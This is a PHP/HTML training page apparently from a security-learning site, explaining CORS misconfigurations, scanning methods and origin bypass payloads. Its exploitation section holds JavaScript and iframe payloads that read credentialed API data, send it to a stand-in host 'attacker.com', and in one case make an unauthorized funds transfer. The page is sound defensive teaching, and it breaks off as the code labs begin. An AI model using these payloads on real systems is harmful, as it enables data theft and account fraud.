<?php
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Config/db.php');
session_start();
$isLoggedIn = isset($_SESSION['user_id']);
$isStrictAuth = true;

?>
<!DOCTYPE html>
<html lang="en" dir="ltr">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description"
    content="Master CORS vulnerabilities - Understanding Cross-Origin Resource Sharing misconfigurations, credential leakage, and implementing robust defenses. Complete cybersecurity training module.">
  <title>Cross-Origin Resource Sharing (CORS) - Complete Guide | DarkHunter</title>

  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link
    href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&display=swap"
    rel="stylesheet">
  <link rel="stylesheet" type="text/css" href="/DarkHunter/learningBugs/css/cors-info.css?v=1.1">

</head>

<body>
  <div class="grid-bg"></div>
  <?php include_once $_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Public/login-modal.php'; ?>
  <button class="mobile-menu-btn" onclick="toggleSidebar()">☰</button>

  <div class="app-container">
    <a href="/DarkHunter/Public/Learning.php" class="modern-back-btn">
      <i>←</i>
      <span>Back to Modules</span>
    </a>

    <aside class="sidebar">
      <div class="sidebar-header">
        <div class="sidebar-brand">
          👾 <span>DARK</span>HUNTER
        </div>
      </div>

      <div class="nav-section">
        <div class="nav-title">Navigation</div>
        <ul class="nav-links">
          <li><a href="#overview" class="active"><i>📚</i> Overview</a></li>
          <li><a href="#mechanism"><i>⚙️</i> How It Works</a></li>
          <li><a href="#exploitation"><i>🎯</i> Exploitation Steps</a></li>
          <li><a href="#impact"><i>💥</i> Real-World Impact</a></li>
          <li><a href="#labs"><i>💻</i> Code Labs</a></li>
          <li><a href="#bypass"><i>🚧</i> Bypass Techniques</a></li>
          <li><a href="#mitigation"><i>🛡️</i> Prevention</a></li>
        </ul>
      </div>

      <div class="nav-section">
        <div class="nav-title">Related Modules</div>
        <ul class="nav-links">
          <li><a href="/DarkHunter/learningBugs/xss-info.php"><i>💻</i> XSS</a></li>
          <li><a href="/DarkHunter/learningBugs/sqli-info.php"><i>🗃️</i> SQL Injection</a></li>
          <li><a href="/DarkHunter/learningBugs/csrf-info.php"><i>🧬</i> CSRF</a></li>
          <li><a href="/DarkHunter/learningBugs/idor-info.php"><i>🆔</i> IDOR</a></li>
          <li><a href="/DarkHunter/learningBugs/jwt-info.php"><i>🎫</i> JWT</a></li>
          <li><a href="/DarkHunter/learningBugs/ssti-info.php"><i>🧪</i> SSTI</a></li>
          <li><a href="/DarkHunter/learningBugs/ssrf-info.php"><i>🌐</i> SSRF</a></li>
          <li><a href="/DarkHunter/learningBugs/file-upload-info.php"><i>📤</i> File Upload</a></li>
          <li><a href="/DarkHunter/learningBugs/cache-poisoning-info.php"><i>🧃</i> Cache Poisoning</a></li>
          <li><a href="/DarkHunter/learningBugs/host-header-info.php"><i>🖥️</i> Host Header Injection</a></li>
          <li><a href="/DarkHunter/learningBugs/oauth-info.php"><i>🔑</i> OAUTH</a></li>
          <li><a href="/DarkHunter/learningBugs/http-smuggling-info.php"><i>📦</i> HTTP Smuggling</a></li>
          <li><a href="/DarkHunter/learningBugs/html-injection-info.php"><i>📝</i> HTML Injection</a></li>
          <li><a href="/DarkHunter/learningBugs/lfi-info.php"><i>📁</i> LFI</a></li>
          <li><a href="/DarkHunter/learningBugs/open-redirect-info.php"><i>↪️</i> Open Redirect</a></li>
          <li><a href="/DarkHunter/learningBugs/rce-info.php"><i>💻</i> RCE</a></li>
          <li><a href="/DarkHunter/learningBugs/race-condition-info.php"><i>⚡</i> Race Condition</a></li>
        </ul>
      </div>
    </aside>

    <main class="main-content">
      <div class="page-header">
        <h1 class="page-title">Cross-Origin Resource Sharing (CORS)</h1>
        <p class="page-subtitle">
          Master CORS vulnerabilities - Learn how misconfigured Cross-Origin Resource Sharing policies enable
          attackers to steal sensitive data, perform unauthorized actions, and compromise user accounts across
          origins. Understand the Same-Origin Policy, preflight mechanisms, and defense strategies.
        </p>
      </div>

      <div class="content-card">
        <div class="toc">
          <div class="toc-title">📋 Table of Contents</div>
          <ul class="toc-list">
            <li><a href="#overview">1. What is CORS?</a></li>
            <li><a href="#mechanism">2. Technical Mechanism</a></li>
            <li><a href="#exploitation">3. Exploitation Steps</a></li>
            <li><a href="#impact">4. Real-World Impact</a></li>
            <li><a href="#labs">5. Code Labs: Vulnerable vs Secure</a></li>
            <li><a href="#bypass">6. Bypass Techniques</a></li>
            <li><a href="#mitigation">7. Prevention Checklist</a></li>
          </ul>
        </div>
      </div>

      <div id="overview" class="content-card">
        <h2 class="card-title"><i>📚</i> What is Cross-Origin Resource Sharing (CORS)?</h2>

        <div class="highlight-box">
          <strong>Definition:</strong> Cross-Origin Resource Sharing (CORS) is a browser security mechanism that
          controls how web pages in one domain can request and interact with resources in another domain. CORS
          misconfigurations occur when servers implement overly permissive access controls, allowing malicious
          websites to make authenticated cross-origin requests and read sensitive responses, effectively bypassing
          the browser's Same-Origin Policy (SOP).
        </div>

        <p class="text-content">
          The Same-Origin Policy is a fundamental browser security feature that restricts how documents or scripts
          loaded from one origin can interact with resources from another origin. CORS was introduced as a controlled
          relaxation of SOP to enable legitimate cross-origin interactions (like APIs serving multiple clients).
          However, when implemented incorrectly—such as reflecting arbitrary origins, allowing wildcard credentials,
          or trusting attacker-controlled domains—CORS becomes a dangerous vulnerability that enables data theft
          and account compromise.
        </p>

        <div class="danger-box">
          <strong>⚠️ Critical Impact:</strong> CORS misconfigurations can lead to sensitive data exfiltration from
          authenticated APIs, account takeover via stolen session tokens, unauthorized actions on behalf of users,
          bypass of CSRF protections, and complete compromise of API-backed applications. When combined with XSS,
          CORS flaws can escalate to full application compromise.
        </div>

        <h3 class="subsection-title">CVSS Severity Assessment</h3>
        <div class="highlight-box">
          <strong>CVSS Score Range: 6.5 - 8.5 (Medium to High)</strong>
          <ul style="margin-left: 2rem; margin-top: 0.5rem;">
            <li><strong>Attack Vector:</strong> Network (remotely exploitable via malicious website)</li>
            <li><strong>Attack Complexity:</strong> Low (often requires victim to visit attacker page)</li>
            <li><strong>Privileges Required:</strong> None (victim's browser makes authenticated requests)</li>
            <li><strong>User Interaction:</strong> Required (victim must visit attacker-controlled site)</li>
            <li><strong>Scope:</strong> Changed (affects target application via victim's session)</li>
            <li><strong>Impact:</strong> High on Confidentiality and Integrity, Low on Availability</li>
          </ul>
        </div>

        <h3 class="subsection-title">Types of CORS Misconfigurations</h3>
        <p class="text-content">
          CORS vulnerabilities manifest in different forms based on the specific misconfiguration:
        </p>

        <div class="cors-scenario-grid">
          <div class="cors-card danger">
            <div class="cors-title">Wildcard with Credentials</div>
            <div class="cors-desc">Access-Control-Allow-Origin: * combined with Access-Control-Allow-Credentials: true.
              Browser rejects this combination, but developers often work around it dynamically.</div>
          </div>
          <div class="cors-card danger">
            <div class="cors-title">Reflected Origin</div>
            <div class="cors-desc">Server reflects any Origin header value without validation, allowing arbitrary
              domains to read authenticated responses.</div>
          </div>
          <div class="cors-card danger">
            <div class="cors-title">Null Origin Trust</div>
            <div class="cors-desc">Server allows null origin (from sandboxed iframes, data://, file:// URLs), which
              attackers can exploit via sandboxed iframes.</div>
          </div>
          <div class="cors-card warning">
            <div class="cors-title">Subdomain Trust</div>
            <div class="cors-desc">Overly broad subdomain matching (*.example.com) allows takeover via compromised
              subdomains or subdomain enumeration.</div>
          </div>
          <div class="cors-card warning">
            <div class="cors-title">HTTP Origin Trust</div>
            <div class="cors-desc">Trusting HTTP origins when the API is HTTPS, enabling MITM attacks to exploit CORS
              policies.</div>
          </div>
          <div class="cors-card warning">
            <div class="cors-title">Method/Header Over-permission</div>
            <div class="cors-desc">Allowing dangerous HTTP methods (PUT, DELETE) or sensitive headers without proper
              validation.</div>
          </div>
        </div>

        <h3 class="subsection-title">CORS Headers Reference</h3>
        <table class="header-table">
          <tr>
            <th>Header</th>
            <th>Purpose</th>
            <th>Dangerous Values</th>
          </tr>
          <tr>
            <td class="header-name">Access-Control-Allow-Origin</td>
            <td>Specifies allowed origins</td>
            <td>*, null, reflected origin</td>
          </tr>
          <tr>
            <td class="header-name">Access-Control-Allow-Credentials</td>
            <td>Allows cookies/auth headers</td>
            <td>true with wildcard origin</td>
          </tr>
          <tr>
            <td class="header-name">Access-Control-Allow-Methods</td>
            <td>Permitted HTTP methods</td>
            <td>PUT, DELETE without validation</td>
          </tr>
          <tr>
            <td class="header-name">Access-Control-Allow-Headers</td>
            <td>Permitted request headers</td>
            <td>*, Authorization without need</td>
          </tr>
          <tr>
            <td class="header-name">Access-Control-Expose-Headers</td>
            <td>Headers visible to client</td>
            <td>X-Auth-Token, Set-Cookie</td>
          </tr>
          <tr>
            <td class="header-name">Access-Control-Max-Age</td>
            <td>Preflight cache duration</td>
            <td>Excessively long values</td>
          </tr>
        </table>

        <div class="diagram-container">
          <div class="diagram-label">📊 CORS Attack Architecture</div>
          <div class="diagram-placeholder">
            <i>🖼️</i><br>
            [Insert Diagram: Attacker Site → Victim Browser → Authenticated CORS Request → API Server → Sensitive Data
            Leak]
          </div>
        </div>
      </div>

      <div id="mechanism" class="content-card">
        <h2 class="card-title"><i>⚙️</i> How CORS Works: Technical Deep Dive</h2>

        <h3 class="subsection-title">The Same-Origin Policy (SOP)</h3>
        <p class="text-content">
          SOP restricts how documents or scripts loaded from one origin can interact with resources from another
          origin. An origin is defined by the scheme (protocol), host (domain), and port.
        </p>

        <div class="code-block">
          <div class="code-header"><span class="code-label">Origin Comparison Examples</span></div>
          <pre><code><span class="code-comment">-- Same Origin (all allowed)</span>
<span class="code-string">https://example.com/page1</span>  →  <span class="code-string">https://example.com/page2</span>
<span class="code-string">https://api.example.com/v1</span>  →  <span class="code-string">https://api.example.com/v2</span>

<span class="code-comment">-- Different Origin (blocked by SOP)</span>
<span class="code-string">https://example.com</span>        →  <span class="code-string">http://example.com</span>       <span class="code-comment">-- Different scheme</span>
<span class="code-string">https://example.com</span>        →  <span class="code-string">https://evil.com</span>         <span class="code-comment">-- Different host</span>
<span class="code-string">https://example.com:443</span>    →  <span class="code-string">https://example.com:8080</span>  <span class="code-comment">-- Different port</span>
<span class="code-string">https://a.example.com</span>      →  <span class="code-string">https://b.example.com</span>    <span class="code-comment">-- Different subdomain</span></code></pre>
        </div>

        <h3 class="subsection-title">Simple vs Preflighted Requests</h3>
        <p class="text-content">
          CORS distinguishes between "simple" requests (GET, POST with specific content-types) and "preflighted"
          requests (PUT, DELETE, custom headers) which require an OPTIONS preflight check.
        </p>

        <div class="code-block">
          <div class="code-header"><span class="code-label">Simple Request (No Preflight)</span></div>
          <pre><code><span class="code-comment">-- Simple GET request with credentials</span>
<span class="code-tag">GET</span> <span class="code-attr">/api/user/profile</span> <span class="code-tag">HTTP/1.1</span>
<span class="code-attr">Host</span>: <span class="code-string">api.example.com</span>
<span class="code-attr">Origin</span>: <span class="code-string">https://evil.com</span>
<span class="code-attr">Cookie</span>: <span class="code-string">session=abc123; auth=xyz789</span>

<span class="code-comment">-- Server response (VULNERABLE: reflects arbitrary origin)</span>
<span class="code-tag">HTTP/1.1</span> <span class="code-keyword">200</span> OK
<span class="code-attr">Access-Control-Allow-Origin</span>: <span class="code-string">https://evil.com</span>     <span class="code-comment">-- Reflected!</span>
<span class="code-attr">Access-Control-Allow-Credentials</span>: <span class="code-string">true</span>              <span class="code-comment">-- Credentials allowed!</span>
<span class="code-attr">Content-Type</span>: <span class="code-string">application/json</span>

{<span class="code-attr">"email"</span>: <span class="code-string">"admin@example.com"</span>, <span class="code-attr">"ssn"</span>: <span class="code-string">"123-45-6789"</span>, <span class="code-attr">"balance"</span>: <span class="code-keyword">50000</span>}</code></pre>
        </div>

        <div class="code-block">
          <div class="code-header"><span class="code-label">Preflight Request (OPTIONS)</span></div>
          <pre><code><span class="code-comment">-- Preflight OPTIONS request</span>
<span class="code-tag">OPTIONS</span> <span class="code-attr">/api/user/update</span> <span class="code-tag">HTTP/1.1</span>
<span class="code-attr">Host</span>: <span class="code-string">api.example.com</span>
<span class="code-attr">Origin</span>: <span class="code-string">https://evil.com</span>
<span class="code-attr">Access-Control-Request-Method</span>: <span class="code-string">PUT</span>
<span class="code-attr">Access-Control-Request-Headers</span>: <span class="code-string">X-Auth-Token, Content-Type</span>

<span class="code-comment">-- Server preflight response (OVERLY PERMISSIVE)</span>
<span class="code-tag">HTTP/1.1</span> <span class="code-keyword">204</span> No Content
<span class="code-attr">Access-Control-Allow-Origin</span>: <span class="code-string">https://evil.com</span>
<span class="code-attr">Access-Control-Allow-Methods</span>: <span class="code-string">GET, POST, PUT, DELETE, OPTIONS</span>  <span class="code-comment">-- Too broad!</span>
<span class="code-attr">Access-Control-Allow-Headers</span>: <span class="code-string">*</span>                                    <span class="code-comment">-- Any header!</span>
<span class="code-attr">Access-Control-Allow-Credentials</span>: <span class="code-string">true</span>
<span class="code-attr">Access-Control-Max-Age</span>: <span class="code-keyword">86400</span>                                       <span class="code-comment">-- 24 hours cached!</span></code></pre>
        </div>

        <h3 class="subsection-title">Common Vulnerable Patterns</h3>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Vulnerable Server-Side Implementations</span></div>
          <pre><code><span class="code-comment">-- Pattern 1: Wildcard with credentials (browser blocks, but...)</span>
<span class="code-attr">Access-Control-Allow-Origin</span>: <span class="code-string">*</span>
<span class="code-attr">Access-Control-Allow-Credentials</span>: <span class="code-string">true</span>

<span class="code-comment">-- Pattern 2: Reflected origin (most dangerous)</span>
<span class="code-comment">-- Server code: header("Access-Control-Allow-Origin: " . $_SERVER['HTTP_ORIGIN']);</span>
<span class="code-attr">Access-Control-Allow-Origin</span>: <span class="code-string">https://attacker.com</span>
<span class="code-attr">Access-Control-Allow-Credentials</span>: <span class="code-string">true</span>

<span class="code-comment">-- Pattern 3: Null origin allowance</span>
<span class="code-attr">Access-Control-Allow-Origin</span>: <span class="code-string">null</span>
<span class="code-attr">Access-Control-Allow-Credentials</span>: <span class="code-string">true</span>

<span class="code-comment">-- Pattern 4: Overly broad subdomain regex</span>
<span class="code-comment">-- Regex: /^https:\/\/.*\.example\.com$/</span>
<span class="code-attr">Access-Control-Allow-Origin</span>: <span class="code-string">https://evil.example.com.attacker.com</span>  <span class="code-comment">-- Bypass!</span>

<span class="code-comment">-- Pattern 5: HTTP origin trusted for HTTPS API</span>
<span class="code-attr">Access-Control-Allow-Origin</span>: <span class="code-string">http://example.com</span>  <span class="code-comment">-- MITM possible!</span></code></pre>
        </div>

        <h3 class="subsection-title">The Attack Chain</h3>
        <div class="attack-flow">
          <div class="flow-step">
            <div class="flow-icon attack">🎣</div>
            <div class="flow-label">Victim Visits</div>
            <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">Attacker's malicious site</p>
          </div>
          <div class="flow-step">
            <div class="flow-icon server">📨</div>
            <div class="flow-label">Malicious JS</div>
            <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">Makes CORS request to API</p>
          </div>
          <div class="flow-step">
            <div class="flow-icon victim">🔐</div>
            <div class="flow-label">Browser Adds</div>
            <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">Session cookies automatically
            </p>
          </div>
          <div class="flow-step">
            <div class="flow-icon attack">✅</div>
            <div class="flow-label">Server Responds</div>
            <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">With permissive CORS headers
            </p>
          </div>
          <div class="flow-step">
            <div class="flow-icon server">📤</div>
            <div class="flow-label">Data Exfiltration</div>
            <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">Sensitive data sent to attacker
            </p>
          </div>
        </div>
      </div>

      <div id="exploitation" class="content-card">
        <h2 class="card-title"><i>🎯</i> Exploitation Steps: Finding and Exploiting CORS</h2>

        <h3 class="subsection-title">Step 1: Identify CORS-Enabled Endpoints</h3>
        <p class="text-content">
          Map API endpoints and analyze their CORS headers using automated tools and manual inspection.
        </p>

        <div class="highlight-box">
          <strong>Reconnaissance Checklist:</strong>
          <ul style="margin-left: 2rem;">
            <li>Check API endpoints for CORS headers in responses</li>
            <li>Send requests with <code>Origin: https://evil.com</code> header</li>
            <li>Analyze preflight responses for overly permissive settings</li>
            <li>Test with null origin: <code>Origin: null</code></li>
            <li>Test with subdomain variations and domain suffixes</li>
            <li>Check if credentials are allowed with dynamic origins</li>
          </ul>
        </div>

        <h3 class="subsection-title">Step 2: Automated CORS Scanning</h3>
        <p class="text-content">
          Use specialized tools to detect CORS misconfigurations across the application.
        </p>

        <div class="code-block">
          <div class="code-header"><span class="code-label">CORS Detection Tools & Scripts</span></div>
          <pre><code><span class="code-comment">-- Using CORScanner (Python)</span>
<span class="code-string">python cors_scan.py -u https://api.example.com</span>
<span class="code-string">python cors_scan.py -i urls.txt -t 50</span>

<span class="code-comment">-- Using Burp Suite extension: CORS*</span>
<span class="code-comment">-- 1. Install CORS* extension from BApp Store</span>
<span class="code-comment">-- 2. Run active scan on target</span>
<span class="code-comment">-- 3. Review findings for misconfigurations</span>

<span class="code-comment">-- Using curl for manual testing</span>
<span class="code-string">curl -I -H "Origin: https://evil.com" https://api.example.com/user</span>
<span class="code-string">curl -I -H "Origin: null" https://api.example.com/user</span>

<span class="code-comment">-- Custom Python scanner</span>
<span class="code-keyword">import</span> requests

<span class="code-attr">TARGET</span> = <span class="code-string">"https://api.example.com"</span>
<span class="code-attr">ENDPOINTS</span> = [<span class="code-string">"/user"</span>, <span class="code-string">"/account"</span>, <span class="code-string">"/api/data"</span>]
<span class="code-attr">ORIGINS</span> = [
    <span class="code-string">"https://evil.com"</span>,
    <span class="code-string">"null"</span>,
    <span class="code-string">"https://example.com.evil.com"</span>,
    <span class="code-string">"http://example.com"</span>
]

<span class="code-keyword">for</span> endpoint <span class="code-keyword">in</span> ENDPOINTS:
    <span class="code-keyword">for</span> origin <span class="code-keyword">in</span> ORIGINS:
        resp = requests.<span class="code-function">get</span>(
            <span class="code-string">f"{TARGET}{endpoint}"</span>,
            headers={<span class="code-string">"Origin"</span>: origin},
            allow_redirects=<span class="code-keyword">False</span>
        )
        
        acao = resp.headers.<span class="code-function">get</span>(<span class="code-string">'Access-Control-Allow-Origin'</span>)
        acac = resp.headers.<span class="code-function">get</span>(<span class="code-string">'Access-Control-Allow-Credentials'</span>)
        
        <span class="code-keyword">if</span> acao == origin <span class="code-keyword">and</span> acac == <span class="code-string">'true'</span>:
            <span class="code-function">print</span>(<span class="code-string">f"[CRITICAL] Reflected origin with credentials: {endpoint}"</span>)
        <span class="code-keyword">elif</span> acao == <span class="code-string">'*'</span>:
            <span class="code-function">print</span>(<span class="code-string">f"[WARNING] Wildcard origin: {endpoint}"</span>)</code></pre>
        </div>

        <h3 class="subsection-title">Step 3: Manual Payload Testing</h3>
        <p class="text-content">
          Test various origin payloads to bypass validation logic and identify edge cases.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">CORS Bypass Payloads</span></div>
          <pre><code><span class="code-comment">-- Test 1: Basic reflected origin</span>
<span class="code-tag">GET</span> <span class="code-attr">/api/user</span> <span class="code-tag">HTTP/1.1</span>
<span class="code-attr">Origin</span>: <span class="code-string">https://evil.com</span>

<span class="code-comment">-- Test 2: Null origin (sandboxed iframe)</span>
<span class="code-tag">GET</span> <span class="code-attr">/api/user</span> <span class="code-tag">HTTP/1.1</span>
<span class="code-attr">Origin</span>: <span class="code-string">null</span>

<span class="code-comment">-- Test 3: Subdomain takeover pattern</span>
<span class="code-attr">Origin</span>: <span class="code-string">https://api.example.com.evil.com</span>

<span class="code-comment">-- Test 4: Domain suffix bypass</span>
<span class="code-attr">Origin</span>: <span class="code-string">https://evil-example.com</span>

<span class="code-comment">-- Test 5: Scheme downgrade</span>
<span class="code-attr">Origin</span>: <span class="code-string">http://example.com</span>  <span class="code-comment">-- If API is HTTPS</span>

<span class="code-comment">-- Test 6: Port variation</span>
<span class="code-attr">Origin</span>: <span class="code-string">https://example.com:8080</span>

<span class="code-comment">-- Test 7: URL encoding tricks</span>
<span class="code-attr">Origin</span>: <span class="code-string">https://evil%00.com</span>
<span class="code-attr">Origin</span>: <span class="code-string">https://evil.com?example.com</span>

<span class="code-comment">-- Test 8: Special characters in subdomain</span>
<span class="code-attr">Origin</span>: <span class="code-string">https://evil.example.com</span></code></pre>
        </div>

        <h3 class="subsection-title">Step 4: Exploitation with Malicious JavaScript</h3>
        <p class="text-content">
          Once a vulnerable endpoint is identified, create a malicious page to exploit the misconfiguration and
          exfiltrate data.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Exploit Payloads</span></div>
          <pre><code><span class="code-comment">-- Basic data theft exploit</span>
<span class="code-tag">&lt;script&gt;</span>
<span class="code-keyword">fetch</span>(<span class="code-string">'https://api.example.com/user/profile'</span>, {
    <span class="code-attr">method</span>: <span class="code-string">'GET'</span>,
    <span class="code-attr">credentials</span>: <span class="code-string">'include'</span>  <span class="code-comment">-- Send cookies!</span>
})
.<span class="code-function">then</span>(<span class="code-attr">response</span> => response.<span class="code-function">json</span>())
.<span class="code-function">then</span>(<span class="code-attr">data</span> => {
    <span class="code-comment">// Exfiltrate to attacker server</span>
    <span class="code-keyword">fetch</span>(<span class="code-string">'https://attacker.com/steal?data='</span> + <span class="code-function">btoa</span>(<span class="code-function">JSON.stringify</span>(data)));
});
<span class="code-tag">&lt;/script&gt;</span>

<span class="code-comment">-- Advanced exploit: Chain with XSS for token extraction</span>
<span class="code-tag">&lt;script&gt;</span>
<span class="code-keyword">async function</span> <span class="code-function">stealData</span>() {
    <span class="code-keyword">try</span> {
        <span class="code-comment">// Steal user profile</span>
        <span class="code-keyword">const</span> profile = <span class="code-keyword">await</span> <span class="code-keyword">fetch</span>(<span class="code-string">'https://api.example.com/user'</span>, {
            <span class="code-attr">credentials</span>: <span class="code-string">'include'</span>
        }).<span class="code-function">then</span>(<span class="code-attr">r</span> => r.<span class="code-function">json</span>());
        
        <span class="code-comment">// Steal account balance</span>
        <span class="code-keyword">const</span> balance = <span class="code-keyword">await</span> <span class="code-keyword">fetch</span>(<span class="code-string">'https://api.example.com/account/balance'</span>, {
            <span class="code-attr">credentials</span>: <span class="code-string">'include'</span>
        }).<span class="code-function">then</span>(<span class="code-attr">r</span> => r.<span class="code-function">json</span>());
        
        <span class="code-comment">// Perform unauthorized transfer</span>
        <span class="code-keyword">await</span> <span class="code-keyword">fetch</span>(<span class="code-string">'https://api.example.com/transfer'</span>, {
            <span class="code-attr">method</span>: <span class="code-string">'POST'</span>,
            <span class="code-attr">credentials</span>: <span class="code-string">'include'</span>,
            <span class="code-attr">headers</span>: {<span class="code-string">'Content-Type'</span>: <span class="code-string">'application/json'</span>},
            <span class="code-attr">body</span>: <span class="code-function">JSON.stringify</span>({
                <span class="code-attr">to</span>: <span class="code-string">'attacker-account'</span>,
                <span class="code-attr">amount</span>: balance.amount
            })
        });
        
        <span class="code-comment">// Exfiltrate everything</span>
        <span class="code-keyword">fetch</span>(<span class="code-string">'https://attacker.com/loot'</span>, {
            <span class="code-attr">method</span>: <span class="code-string">'POST'</span>,
            <span class="code-attr">body</span>: <span class="code-function">JSON.stringify</span>({profile, balance})
        });
    } <span class="code-keyword">catch</span>(<span class="code-attr">e</span>) {
        <span class="code-function">console.error</span>(<span class="code-string">'Exploit failed:'</span>, e);
    }
}

<span class="code-function">stealData</span>();
<span class="code-tag">&lt;/script&gt;</span></code></pre>
        </div>

        <h3 class="subsection-title">Step 5: Null Origin Exploitation</h3>
        <p class="text-content">
          When servers accept null origin, exploit via sandboxed iframes or local HTML files.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Null Origin Attack Vector</span></div>
          <pre><code><span class="code-comment">-- Attacker hosts this page:</span>
<span class="code-tag">&lt;iframe</span> <span class="code-attr">sandbox</span>=<span class="code-string">"allow-scripts"</span> <span class="code-attr">srcdoc</span>=<span class="code-string">"</span>
<span class="code-string">  &lt;script&gt;</span>
<span class="code-string">    fetch('https://api.example.com/user', {</span>
<span class="code-string">      credentials: 'include'</span>
<span class="code-string">    })</span>
<span class="code-string">    .then(r => r.json())</span>
<span class="code-string">    .then(data => {</span>
<span class="code-string">      fetch('https://attacker.com/steal?d=' + btoa(JSON.stringify(data)));</span>
<span class="code-string">    });</span>
<span class="code-string">  &lt;/script&gt;</span>
<span class="code-string">"</span><span class="code-tag">&gt;&lt;/iframe&gt;</span>

<span class="code-comment">-- Or via data:// URL (some browsers)</span>
<span class="code-tag">&lt;iframe</span> <span class="code-attr">src</span>=<span class="code-string">"data:text/html,&lt;script&gt;fetch('https://api.example.com/user',{credentials:'include'}).then(r=&gt;r.json()).then(d=&gt;fetch('https://attacker.com/steal?'+btoa(JSON.stringify(d))))&lt;/script&gt;"</span><span class="code-tag">&gt;&lt;/iframe&gt;</span>

<span class="code-comment">-- Or via local file (file:// protocol sends null origin)</span>
<span class="code-comment">-- Victim opens saved HTML file from desktop</span></code></pre>
        </div>

        <div class="diagram-container">
          <div class="diagram-label">🎬 Video: CORS Misconfiguration Exploitation</div>
          <div class="video-placeholder">
            <i>▶️</i><br>
            [Insert Video: Complete CORS exploitation from detection to data exfiltration]
          </div>
        </div>
      </div>

      <div id="impact" class="content-card">
        <h2 class="card-title"><i>💥</i> Real-World Impact: Notorious CORS Breaches</h2>

        <h3 class="subsection-title">Case Study 1: Uber Account Takeover via CORS (2017)</h3>
        <p class="text-content">
          Security researcher Anand Prakash discovered that Uber's API (uber.com) reflected arbitrary origins and
          allowed credentials. An attacker could host a malicious page that made authenticated requests to Uber's
          API, stealing rider tokens and personal information.
        </p>
        <div class="danger-box">
          <strong>Impact:</strong> Full account takeover, access to trip history, payment methods, and personal
          data. The vulnerability allowed attackers to request rides, view locations, and modify account settings
          on behalf of victims. Uber paid a significant bug bounty.
        </div>

        <h3 class="subsection-title">Case Study 2: Shopify CORS to Store Takeover (2020)</h3>
        <p class="text-content">
          Researchers found that Shopify's admin API had CORS misconfigurations allowing arbitrary origins with
          credentials on certain endpoints. By combining this with XSS on a Shopify app, attackers could steal
          merchant session tokens and take over stores.
        </p>
        <div class="warning-box">
          <strong>Attack Chain:</strong> Malicious Shopify app → CORS misconfiguration on admin API → Steal
          session cookie → Full store compromise → Access customer data, orders, payment settings. Affected
          thousands of merchant stores.
        </div>

        <h3 class="subsection-title">Case Study 3: Binance CORS Vulnerability (2019)</h3>
        <p class="text-content">
          The cryptocurrency exchange Binance had a CORS misconfiguration that allowed any subdomain of binance.com
          to make credentialed requests. Attackers could register a subdomain or exploit an XSS on any Binance
          subdomain to access user accounts.
        </p>
        <div class="highlight-box">
          <strong>Impact:</strong> Potential for cryptocurrency theft, trading manipulation, and KYC data exposure.
          While quickly patched, the vulnerability demonstrated how CORS trust in subdomains can be dangerous in
          complex domain hierarchies.
        </div>

        <h3 class="subsection-title">Case Study 4: PayPal CORS Data Leak (2019)</h3>
        <p class="text-content">
          PayPal's API endpoints reflected the Origin header without proper validation on several endpoints,
          allowing malicious sites to read sensitive user data including email addresses, phone numbers, and
          transaction history.
        </p>
        <div class="danger-box">
          <strong>Impact:</strong> Exposure of financial transaction data, personal identifiable information (PII),
          and account metadata. Demonstrated that even mature financial institutions can have CORS implementation
          flaws in microservice architectures.
        </div>

        <h3 class="subsection-title">Common Attack Scenarios by Industry</h3>

        <div class="highlight-box">
          <table style="width: 100%; border-collapse: collapse;">
            <tr style="border-bottom: 1px solid var(--border-color);">
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-green);">Industry</th>
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-purple);">CORS Attack Scenario</th>
              <th style="padding: 0.75rem; text-align: left; color: var(--danger);">Potential Damage</th>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Fintech/Banking</td>
              <td style="padding: 0.75rem;">Steal session tokens, perform unauthorized transfers</td>
              <td style="padding: 0.75rem;">Financial fraud, account draining</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Healthcare</td>
              <td style="padding: 0.75rem;">Access patient records via API</td>
              <td style="padding: 0.75rem;">HIPAA violations, privacy breaches</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">E-Commerce</td>
              <td style="padding: 0.75rem;">Read order history, modify cart/checkout</td>
              <td style="padding: 0.75rem;">Data theft, payment fraud</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">SaaS/Cloud</td>
              <td style="padding: 0.75rem;">Access admin APIs, user management</td>
              <td style="padding: 0.75rem;">Tenant data exposure, lateral movement</td>
            </tr>
            <tr>
              <td style="padding: 0.75rem;">Social Media</td>
              <td style="padding: 0.75rem;">Read private messages, post as user</td>
              <td style="padding: 0.75rem;">Privacy violation, reputation damage</td>
            </tr>
          </table>
        </div>
      </div>

      <div id="labs" class="content-card">
        <h2 class="card-title"><i>💻</i> Code Labs: Vulnerable vs Secure Implementation</h2>

        <div class="warning-box">
          <strong>🎯 Lab Objective:</strong> Understand how improper CORS configuration enables cross-origin data
          theft, then implement strict origin validation, credential controls, and defense-in-depth strategies.
        </div>

        <h3 class="subsection-title">Lab 1: Reflected Origin Vulnerability</h3>
        <p class="text-content">
          <strong>Vulnerability:</strong> Server reflects any Origin header without validation, enabling arbitrary
          cross-origin access with credentials.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header">
            <span class="code-label">❌ Vulnerable PHP Code</span>
            <div class="code-actions">
